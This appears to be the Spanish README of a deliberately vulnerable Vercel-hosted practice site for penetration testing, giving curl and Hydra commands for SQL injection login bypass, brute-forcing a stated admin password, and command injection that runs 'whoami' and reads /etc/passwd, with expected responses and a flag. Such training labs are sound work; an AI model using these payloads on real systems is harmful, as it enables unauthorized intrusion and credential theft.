# Nexus Cloud Solutions 🌐

Plataforma web con aspecto y comportamiento 100% corporativo diseñada para pruebas de penetración y demostraciones de ciberseguridad ejecutadas **directamente desde tu propia terminal** (`curl`, `hydra`, `sqlmap`, scripts de Python, etc.).

Totalmente optimizada para desplegarse en **Vercel** usando Serverless Functions en Node.js.

---

## 🎯 Endpoints y Pruebas desde tu Terminal

### 1. 💉 Inyección SQL (SQLi)
* **Endpoint:** `POST /api/login`
* **Prueba con `curl`:**
```bash
# Bypass de autenticación mediante SQL Injection
curl -X POST https://TU-DOMINIO.vercel.app/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "cualquiercosa"}'
```
* **Respuesta esperada:**
```json
{
  "success": true,
  "message": "Inicio de sesión correcto (Acceso Administrativo)",
  "user": {
    "id": 1,
    "username": "admin",
    "role": "SuperAdministrator",
    "token": "nexus_admin_sess_9941a8e2",
    "internal_flag": "FLAG-SQLI{nexus_sql_injection_bypass_success}"
  }
}
```

---

### 2. ⚡ Fuerza Bruta de Credenciales
* **Endpoint:** `POST /api/login`
* **Usuario válido en el sistema:** `admin` (Contraseña correcta: `dragon2024`)
* **Prueba de intento fallido:**
```bash
curl -X POST https://TU-DOMINIO.vercel.app/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "password123"}'
```
* **Respuesta de fallo (HTTP 401 Unauthorized):**
```json
{
  "success": false,
  "error": "Credenciales inválidas"
}
```

* **Prueba con Hydra (Diccionario):**
```bash
hydra -l admin -P diccionario.txt TU-DOMINIO.vercel.app https-post-form "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Credenciales inválidas"
```

---

### 3. 🖥️ Inyección de Comandos del Sistema (Command Injection)
* **Endpoint:** `GET /api/ping?host={host}` o `POST /api/ping`
* **Ping legítimo con `curl`:**
```bash
curl "https://TU-DOMINIO.vercel.app/api/ping?host=8.8.8.8"
```
* **Inyección de comandos arbitrarios:**
```bash
# Ejecutar 'whoami'
curl "https://TU-DOMINIO.vercel.app/api/ping?host=8.8.8.8;whoami"

# Leer archivo /etc/passwd simulado
curl "https://TU-DOMINIO.vercel.app/api/ping?host=127.0.0.1%26%26cat%20/etc/passwd"
```

---

## 🚀 Despliegue en Vercel

1. Haz push a tu repositorio de GitHub:
   ```bash
   git add .
   git commit -m "Deploy NexusCloud"
   git push origin main
   ```
2. Entra en [vercel.com/new](https://vercel.com/new) e importa tu repositorio `lopezjesus-cyber/vul_web`.
3. Vercel desplegará tanto el frontend estático como las funciones serverless (`/api/login` y `/api/ping`) con HTTPS automático.
